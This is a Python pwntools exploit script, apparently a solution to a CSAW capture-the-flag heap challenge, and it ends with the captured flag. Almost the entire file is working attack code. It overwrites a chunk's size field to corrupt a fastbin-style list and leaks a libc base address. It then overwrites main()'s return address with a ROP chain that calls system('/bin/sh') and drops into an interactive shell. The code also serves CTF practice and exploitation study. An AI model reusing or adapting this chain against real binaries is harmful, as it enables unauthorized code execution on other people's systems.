#!/usr/bin/env python
from pwn import *

#r = remote('127.0.0.1', 4000)
r = remote('pwn.chal.csaw.io', 5223)
libc = ELF('libc-2.23.so')

libc_start_main_240_off = 0x20830

def allocate(size):
    r.sendlineafter('Exit\n', '1')
    sleep(0.1)
    r.sendline(str(size))

def delete():
    r.sendlineafter('Exit\n', '2')

def write(content):
    r.sendlineafter('Exit\n', '3')
    sleep(0.1)
    r.send(content)

def print_block():
    r.sendlineafter('Exit\n', '4')

def exit():
    r.sendlineafter('Exit\n', '5')

r.recvuntil('Environment setup: ')
arena = int(r.recvn(14), 16)
log.success('arena: ' + hex(arena))

# overwrite size of next 0x40 block to 0x80
allocate(64)
write('A'*64 + '\x80')
# allocate and deallocate the modified chunk to insert it into chain of 0x80 chunks
allocate(64)
delete()
# get the modified chunk from 0x80 chain,
# this will make us write 0x81 byte among 0x40 chunks, so we can overwrite the fd-like field of following 0x40 chunk. The concept is fastbin corruption, except for that the size field will not be checked !
# my target here is 0x10 byte before return address of main(), which points to libc
allocate(128)
write('B'*64 + p64(0x40) + p64(arena+0x78) + '\n')
# get the fake chunk and leak libc address
allocate(64)
allocate(64)

print_block()
libc_base = u64(r.recvn(6) + '\x00'*2) - libc_start_main_240_off
log.success('libc base: ' + hex(libc_base))
pop_rdi_ret = libc_base + 0x21102
binsh = libc_base + next(libc.search('/bin/sh\x00'))
system = libc_base + libc.symbols['system']

# write to the fake chunk to overwrite return address of main() to ROP chain
write(p64(pop_rdi_ret) + p64(binsh) + p64(system) + '\n')
exit()

r.interactive()

# flag{d0n7_let_m3_g3t_1n_my_z0n3}
